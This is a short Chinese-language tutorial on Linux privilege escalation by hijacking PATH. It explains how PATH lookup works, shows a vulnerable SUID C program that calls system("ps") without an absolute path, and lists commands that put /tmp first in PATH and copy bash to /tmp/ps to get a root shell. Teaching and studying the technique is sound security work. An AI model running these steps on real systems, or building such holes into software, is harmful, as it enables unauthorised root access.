PATH是Linux和Unix操作系统中的一个环境变量，它可以指定可执行程序的所有bin和sbin目录。
当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以找到可执行文件。
超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。

比如我想执行一个ls命令，其实我们执行的是/bin/ls这个可执行文件,而系统就是靠环境变量中我们设置的路径/bin中找到的ls并执行。
而执行的优先级是从前向后查询的，例如：若在usr/local/sbin中到到ls则会执行/usr/local/sbin中的ls，而不会再向下寻找。

## **利用SUID程序中环境变量的修改提权**
先查看具有SUID权限的程序
```
find / -perm -u=s -type f 2>/dev/null
```
如果看到一个第三方程序，如/tmp/shell，则这个程序管理员为了方便给予了SUID。
反编译第三方程序，如：
```
#include<unistd.h>
void main()
{
        setuid(0);
        setgid(0);
        system("ps");
}
```
可以看到使用了ps环境变量，默认情况下执行ps是执行/bin/ps,同时这里设定的ps并未写绝对路径来执行，而是直接ps，那么就可以思考，默认情况下环境变量是一个一个查看，若找到了，就不会再向下查找，那么就可以对环境变量进行劫持。
```
添加一个可控的PATH环境变量
echo $PATH
export PATH=/tmp:$PATH 
echo $PATH

此时执行ps等命令，先从/tmp中找。
cp /bin/bash /tmp/ps

此时执行ps命令执行的bash，即新开一个bash会话。

此时执行原程序./tmp/shell
而原程序是SUID权限，此时会执行bash会话就是root用户的。
```

